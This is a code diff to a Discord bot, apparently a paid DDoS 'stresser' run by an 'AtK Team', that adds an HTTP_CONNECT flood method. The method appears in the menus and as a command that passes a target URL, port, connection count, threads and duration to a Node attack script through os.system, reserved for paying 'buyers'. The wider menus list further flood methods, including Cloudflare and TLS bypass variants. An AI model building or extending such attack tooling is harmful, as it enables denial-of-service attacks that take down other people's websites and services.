@@ -237,7 +237,7 @@ async def Methods(ctx):
 	else:
 		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
 		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\n```")
-		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\n```")
+		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\nHTTP_CONNECT\n```")
 		embet.set_footer(text=f"~>© Owner : CofZZ & Asep | All Methods Show")
 		
 		await ctx.channel.send(embed=embet)
@@ -291,6 +291,7 @@ async def Commands(ctx):
 		embed.add_field(name="**CF-BYPASS**", value="```.CF_BYPASS [url] [thread<50] [time]```")
 		embed.add_field(name="**COFZ_TLS**", value="```.COFZ_TLS [url] [time] [rate] [thread] [proxy]```")
 		embed.add_field(name="**TLS_BYPASS**", value="```.TLS_BYPASS [url] [time] [rate] [thread]```")
+		embed.add_field(name="**HTTP_CONNECT**", value="```.HTTP_CONNECT [url] [port] [connect 1 - 9999]  [thread] [time]```")
 		embed.set_footer(text="~>© Owner : CofZZ & Asep | All Methods Command", icon_url=ctx.author.avatar)
 		
 		await ctx.send(embed=embed)
@@ -647,6 +648,32 @@ async def TLS_BYPASS(ctx, url, time, rate, thread):
 		await ctx.send(embed=embed)
 		
 		os.system(f"node TLS-BYPASS.js {url} {time} {rate} {thread}")
+
+@bot.command()
+async def HTTP_CONNECT(ctx, url, port, conct, thread, time):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`HTTP_CONNECT`")
+		embed.add_field(name="**Port**", value=f"`{port}")
+		embed.add_field(name="**Connect**", value=f"`{conct}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Time**", value=f"`{time}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node HTTP-CONNECTv2.js {url} {port} {conct} {thread} {time}")
 				
 	
 	
